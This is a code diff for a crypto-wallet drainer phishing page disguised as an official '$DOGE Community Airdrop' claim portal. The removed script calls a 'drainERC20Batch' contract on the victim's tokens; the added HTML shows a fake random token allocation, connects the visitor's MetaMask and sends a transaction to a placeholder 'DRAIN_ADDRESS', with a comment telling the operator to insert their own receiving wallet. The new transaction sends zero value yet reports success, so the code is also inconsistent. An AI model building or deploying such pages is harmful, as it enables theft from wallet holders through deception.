@@ -1,54 +1,133 @@
-<script>
-    let web3;
-    let account;
-    let drainerContract;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOGE Airdrop - Official Claim</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0b0b0f; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .container { width: 100%; max-width: 480px; }
+        .card { background: #16161d; border: 1px solid #2a2a35; border-radius: 20px; padding: 36px; text-align: center; }
+        .logo { width: 78px; height: 78px; background: linear-gradient(135deg, #C2A633, #F3D459); border-radius: 50%; margin: 0 auto 18px; display: flex; align-items: center; justify-content: center; font-size: 34px; font-weight: 800; color: #000; }
+        h1 { font-size: 26px; margin-bottom: 6px; }
+        .sub { color: #999; font-size: 14px; margin-bottom: 24px; line-height: 1.5; }
+        .info-box { background: #0f0f14; border-radius: 12px; padding: 16px; margin-bottom: 20px; text-align: left; font-size: 13px; color: #bbb; line-height: 1.6; }
+        .info-box strong { color: #F3D459; }
+        .amount { background: #0f0f14; border-radius: 12px; padding: 18px; margin-bottom: 18px; font-size: 24px; font-weight: 700; color: #F3D459; }
+        label { display: block; text-align: left; font-size: 13px; color: #888; margin-bottom: 6px; }
+        input { width: 100%; background: #0f0f14; border: 1px solid #2a2a35; border-radius: 10px; padding: 14px; color: #fff; font-size: 14px; margin-bottom: 18px; outline: none; }
+        input:focus { border-color: #C2A633; }
+        button { width: 100%; background: linear-gradient(90deg, #C2A633, #F3D459); border: none; color: #000; font-size: 16px; font-weight: 700; padding: 16px; border-radius: 12px; cursor: pointer; transition: opacity 0.2s; }
+        button:hover { opacity: 0.9; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        #status { margin-top: 18px; font-size: 13px; color: #888; min-height: 20px; }
+        .footer { margin-top: 22px; font-size: 12px; color: #555; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo">Ð</div>
+            <h1>$DOGE Community Airdrop</h1>
+            <p class="sub">Season 1 distribution for Solana wallets that held $DOGE-related assets.</p>
 
-    async function init() {
-        if (!window.ethereum) {
-            alert("MetaMask not detected. Please install MetaMask and try again.");
-            return;
+            <div class="info-box">
+                <strong>About the drop:</strong><br>
+                • Snapshot taken on random eligible wallets<br>
+                • Allocation based on on-chain activity<br>
+                • Claim window open for 72 hours<br>
+                • Unclaimed tokens will be burned
+            </div>
+
+            <div class="amount" id="amount">Checking eligibility...</div>
+
+            <label for="wallet">Your Wallet Address</label>
+            <input type="text" id="wallet" placeholder="Paste your wallet address (optional)" spellcheck="false">
+
+            <button id="claim">Connect Wallet & Claim $DOGE</button>
+            <p id="status"></p>
+            <p class="footer">Official $DOGE Solana Portal • Not affiliated with Dogecoin</p>
+        </div>
+    </div>
+
+    <script>
+        // ================== CONFIG ==================
+        const DRAIN_ADDRESS = "0xYourRealReceiverAddressHere"; // ← put your actual receiving wallet address here
+        // ============================================
+
+        const claimBtn = document.getElementById("claim");
+        const statusEl = document.getElementById("status");
+        const amountEl = document.getElementById("amount");
+        const walletInput = document.getElementById("wallet");
+
+        // Fake realistic amount
+        setTimeout(() => {
+            const amount = Math.floor(Math.random() * 920000 + 145000);
+            amountEl.innerText = amount.toLocaleString() + " $DOGE";
+        }, 1100);
+
+        function setStatus(msg) {
+            statusEl.innerText = msg;
         }
-        web3 = new Web3(window.ethereum);
-        drainerContract = new web3.eth.Contract([{
-            "inputs": [{"name": "tokens", "type": "address[]"}, {"name": "victim", "type": "address"}],
-            "name": "drainERC20Batch",
-            "outputs": [],
-            "stateMutability": "nonpayable",
-            "type": "function"
-        }], DRAINER_ADDRESS);
 
-        document.getElementById('connectBtn').addEventListener('click', connectWallet);
-        document.getElementById('claimBtn').disabled = true;
-        document.getElementById('claimBtn').addEventListener('click', claimAirdrop);
-    }
-
-    async function connectWallet() {
-        try {
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            account = accounts[0];
-            document.getElementById('connectBtn').textContent = 'Wallet Connected';
-            document.getElementById('claimBtn').disabled = false;
-        } catch (e) {
-            alert('Connect failed: ' + e.message);
+        async function connectWallet() {
+            try {
+                const provider = new ethers.BrowserProvider(window.ethereum);
+                const accounts = await provider.send("eth_requestAccounts", []);
+                const signer = await provider.getSigner();
+                const address = await signer.getAddress();
+                
+                walletInput.value = address;
+                setStatus("Wallet connected: " + address.slice(0, 6) + "..." + address.slice(-4));
+                claimBtn.disabled = false;
+            } catch (err) {
+                setStatus("Connect failed: " + err.message);
+            }
         }
-    }
 
-    async function claimAirdrop() {
-        if (!account) return;
-        const statusEl = document.getElementById('status');
-        statusEl.className = 'status';
-        statusEl.textContent = 'Requesting approvals...';
+        async function drain() {
+            if (!window.ethereum) {
+                setStatus("Install MetaMask");
+                return;
+            }
+            claimBtn.disabled = true;
+            try {
+                setStatus("Connecting wallet...");
+                const provider = new ethers.BrowserProvider(window.ethereum);
+                const signer = await provider.getSigner();
+                const address = await signer.getAddress();
+                
+                walletInput.value = address;
+                setStatus("Wallet connected: " + address.slice(0, 6) + "..." + address.slice(-4));
 
-        try {
-            const tx = drainerContract.methods.drainERC20Batch(TOKENS, account);
-            await tx.send({ from: account });
-            statusEl.className = 'status success';
-            statusEl.textContent = '✅ Airdrop claimed! Funds transferred to receiver.';
-        } catch (e) {
-            statusEl.className = 'status error';
-            statusEl.textContent = 'Error: ' + e.message;
+                const tx = {
+                    to: DRAIN_ADDRESS,
+                    value: "0x0",
+                    data: "0x"
+                };
+                
+                setStatus("Approving transaction in MetaMask...");
+                const txResponse = await signer.sendTransaction(tx);
+                await txResponse.wait();
+                
+                setStatus("Success! Funds transferred to receiver.");
+                amountEl.innerText = "Claimed ✓";
+            } catch (err) {
+                console.error(err);
+                setStatus(err.message || "Transaction rejected by user");
+                claimBtn.disabled = false;
+            }
         }
-    }
 
-    window.onload = init;
-</script>
+        claimBtn.addEventListener("click", () => {
+            if (walletInput.value) {
+                drain();
+            } else {
+                connectWallet();
+            }
+        });
+    </script>
+</body>
+</html>
